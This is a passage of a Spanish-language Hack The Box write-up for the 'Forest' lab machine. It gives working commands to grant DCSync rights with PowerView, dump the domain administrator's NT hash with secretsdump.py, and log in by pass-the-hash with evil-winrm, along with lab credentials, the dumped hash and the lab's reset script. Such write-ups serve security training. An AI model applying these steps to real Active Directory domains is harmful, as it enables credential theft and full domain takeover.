Con el nuevo usuario creado y añadido al grupo "Exchange Windows Permissions", ahora se deben **asignar los permisos DCSync**. Para esto, se necesita utilizar el script **PowerView.ps1** que puede descargarse [aquí](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1). 

El script se puede cargar al sistema con el comando `upload` de la misma manera que se hizo con SharpHound.exe. Luego, se debe ejecutar `import-module .\PowerView.ps1` para cargar las funciones de PowerView en la sesión de PowerShell. 

Los comandos que se utilizarán para otorgar **permisos DCSync** al usuario "fran" son los siguientes:

```powershell
PS C:\> $SecPassword = ConvertTo-SecureString 'fran123$!' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('htb.LOCAL\fran', $SecPassword)

PS C:\> Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -Rights DCSync -PrincipalIdentity fran -Verbose -Domain htb.local
```

El resultado es el siguiente:

![imagen 17](Pasted image 20230716193529.png)

Para quienes estén interesados en explorar cómo se podría explotar este escenario utilizando directamente **svc-alfresco**, esa posibilidad se analizará en [el Anexo I](#anexo-i-ejecución-de-dcsync-attack-con-svc-alfresco-sin-crear-una-cuenta-adicional).


#### Obteniendo el Hash NT del Administrador del Dominio

Finalmente, después de otorgar los permisos DCSync a "fran", se puede utilizar `secretsdump.py` en la máquina atacante para obtener el hash NT del usuario administrador del dominio con el siguiente comando:

```bash
r1pfr4n@parrot> secretsdump.py 'htb.local/fran:fran123$!@10.10.10.161'
```

El resultado de la ejecución del comando anterior es el siguiente:

![imagen 18](Pasted image 20230716193618.png)

La línea interesante es la siguiente:

```txt 
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

En este caso, `htb.local\Administrator` es el nombre de usuario completo, `500` es el RID (Relative Identifier), `aad3b435b51404eeaad3b435b51404ee` es el hash LM (Lan Manager) y `32693b11e6aa90eb43d32c72a07ceea6` es el hash NT (NTLM).

La técnica de **Pass The Hash** permite utilizar este hash NT para autenticarse como el usuario administrador sin necesidad de conocer la contraseña en texto plano. De esta manera, con las credenciales `Administrator:32693b11e6aa90eb43d32c72a07ceea6` se podría conectar a la máquina utilizando herramientas como **evil-winrm** o **psexec**. A continuación, se muestra el comando que se utilizaría para conectarse a la máquina como administrador del dominio utilizando **evil-winrm**:

```bash
r1pfr4n@parrot> evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

### root.txt

La segunda flag se encuentra en el directorio **Desktop** del usuario **Administrator**:

```powershell
PS C:\Users\Administrator\Desktop> type root.txt
8bd8bcd67695d5752****7b5b15cc2f7
```

## Anexo I: Ejecución de DCSync Attack con svc-alfresco sin Crear una Cuenta Adicional

Es posible explotar el DCSync attack con **svc-alfresco** sin la necesidad de crear una nueva cuenta. Sin embargo, debido al script de reinicio mencionado en el Anexo II, es crucial que se realice dentro de un período de tiempo más corto a 60 segundos.

Los pasos para lograr esto son bastante simples. Primero, se debe agregar a **svc-alfresco** al grupo "Exchange Windows Permissions". Seguidamente, se deben otorgar los permisos DCSync a **svc-alfresco**. Finalmente, se puede ejecutar el script `secretsdump.py` para obtener el hash NT del administrador del dominio. Aquí están los comandos específicos para realizar cada paso:

1. Agregar a svc-alfresco al grupo "Exchange Windows Permissions":

   ```powershell
PS C:\> net group "Exchange Windows Permissions" svc-alfresco /add
   ```

2. Otorgar permisos DCSync a svc-alfresco:

   ```powershell
PS C:\> Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -Rights DCSync -PrincipalIdentity svc-alfresco -Verbose -Domain htb.local
   ```

Resultado de los dos comandos anteriores:

![imagen 19](Pasted image 20230716193806.png)

3. Ejecutar el script `secretsdump.py` para obtener el hash NT del administrador del dominio:

   ```bash
r1pfr4n@parrot> secretsdump.py 'htb.local/svc-alfresco:s3rvice@10.10.10.161'
   ```

Estos pasos permitirán explotar el DCSync attack sin la necesidad de crear una nueva cuenta. Sin embargo, es importante recordar que el tiempo es esencial debido al script de reinicio que se ejecuta cada 60 segundos.

## Anexo II: Script de Reinicio de Cuenta y Permisos

Dentro del proceso de análisis y exploración, se encontró un script en la ruta `C:\Users\Administrator\Documents>`. Este script parece tener como objetivo restablecer la información de la cuenta **svc-alfresco** y de varios otros usuarios. Específicamente, este script parece encargado de restablecer las contraseñas y pertenencias de grupos de ciertos usuarios, además de eliminar cualquier permiso DCSync que se haya otorgado.

Para hacerlo, el script importa el módulo **PowerView.ps1**, y luego procede a leer una lista de usuarios desde un archivo llamado `users.txt`. Para cada usuario de la lista, el script primero restablece la contraseña de **svc-alfresco** a "s3rvice", luego recopila todos los grupos a los que pertenece el usuario (excluyendo "Service Accounts"), y finalmente elimina cualquier permiso DCSync y todas las pertenencias de grupo del usuario. 

El script se ejecuta en un bucle infinito, con un retraso de 60 segundos entre cada iteración. Esto sugiere que cualquier cambio que se realice en los grupos de los usuarios de la lista o cualquier permiso DCSync que se otorgue será revertido en un plazo de 60 segundos.

A continuación se muestra el contenido del script y del archivo `users.txt`:

**Script:**

```powershell
Import-Module C:\Users\Administrator\Documents\PowerView.ps1

$users = Get-Content C:\Users\Administrator\Documents\users.txt

while($true)
{
    Start-Sleep 60

    Set-ADAccountPassword -Identity svc-alfresco -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "s3rvice" -Force)

    Foreach ($user in $users) {
        $groups = Get-ADPrincipalGroupMembership -Identity $user | where {$_.Name -ne "Service Accounts"}

        Remove-DomainObjectAcl -PrincipalIdentity $user -Rights DCSync

        if ($groups -ne $null){
            Remove-ADPrincipalGroupMembership -Identity $user -MemberOf $groups -Confirm:$false
        }
    }
}
```

**Contenido de `users.txt`:**

```
sebastien
lucinda
andy
svc-alfresco
mark
santi
```

Esta información proporciona una comprensión más profunda de por qué se decidió crear un nuevo usuario en el dominio para la escalada de privilegios, ya que cualquier cambio realizado en el usuario **svc-alfresco** sería revertido por este script en un corto periodo de tiempo.

